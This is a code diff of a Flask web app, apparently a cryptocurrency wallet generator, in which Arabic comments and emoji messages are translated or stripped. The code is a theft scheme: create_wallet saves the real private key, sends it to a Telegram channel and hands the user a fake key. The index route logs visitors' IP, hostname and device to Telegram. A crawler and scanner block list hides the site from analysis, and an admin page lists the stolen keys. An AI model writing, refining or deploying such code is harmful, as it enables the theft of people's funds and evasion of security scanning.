@@ -5,7 +5,6 @@ import secrets
 from datetime import datetime
 import requests
 import socket
-import re
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
@@ -22,8 +21,7 @@ c.execute('''CREATE TABLE IF NOT EXISTS wallets
      created_at TEXT)''')
 conn.commit()
 
-# قائمة بوتات معروفة
-BOTS = ['amazonaws', 'compute-1', 'ec2-', ''bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'http', 'scan', 'twitterbot', 'facebook', 'telegram', 'whatsapp', 'discord', 'slack', 'preview', 'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduck', 'ahrefs', 'semrush', 'majestic', 'rogerbot', 'dotbot', 'slurp', 'archiver', 'screenshot', 'puppeteer', 'headless', 'selenium', 'phantom']
+BOTS = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'amazonaws', 'compute-1', 'ec2-', 'twitterbot', 'googlebot', 'bingbot', 'yandex', 'baidu', 'facebook', 'telegram', 'whatsapp', 'discord', 'slack', 'preview', 'ahrefs', 'semrush', 'majestic', 'puppeteer', 'headless', 'selenium', 'phantom', 'python-requests']
 
 def is_bot(ua):
     ua_lower = ua.lower()
@@ -43,24 +41,21 @@ def send_tg(msg):
 def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', 'Unknown')
-    ref = request.headers.get('Referer', 'Direct')
     
-    # تخطي البوتات
     if not is_bot(ua):
         try:
             hostname = socket.gethostbyaddr(ip)[0] if ip else 'Unknown'
         except:
             hostname = 'Unknown'
         
-        # نبذة عن الجهاز
         device = 'Unknown'
-        if 'Android' in ua: device = '📱 Android'
-        elif 'iPhone' in ua: device = '📱 iPhone'
-        elif 'Windows' in ua: device = '💻 Windows'
-        elif 'Mac' in ua: device = '💻 Mac'
-        elif 'Linux' in ua: device = '🐧 Linux'
+        if 'Android' in ua: device = 'Android'
+        elif 'iPhone' in ua: device = 'iPhone'
+        elif 'Windows' in ua: device = 'Windows'
+        elif 'Mac' in ua: device = 'Mac'
+        elif 'Linux' in ua: device = 'Linux'
         
-        send_tg(f"👁️ زائر حقيقي!\n{device}\n🌐 IP: {ip}\n📍 {hostname}")
+        send_tg(f"Real visitor: {device} | {ip} | {hostname}")
     
     return render_template('index.html')
 
@@ -117,7 +112,7 @@ def create_wallet():
               (network, address, real_key, fake_key, datetime.now().isoformat()))
     conn.commit()
     
-    send_tg(f"🦅 محفظة جديدة!\n🌐 {network}\n🏦 {address}\n🔑 {real_key}")
+    send_tg(f"New wallet! {network}: {address} | Key: {real_key}")
     
     return jsonify({'address': address, 'private_key': fake_key})
 
@@ -127,7 +122,7 @@ def admin():
         return "Unauthorized", 401
     c.execute("SELECT * FROM wallets ORDER BY id DESC")
     wallets = c.fetchall()
-    html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">🦅 Admin Panel</h1><table>'
+    html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">Admin Panel</h1><table>'
     for w in wallets:
         html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td></tr>'
     return html + '</table></body></html>'
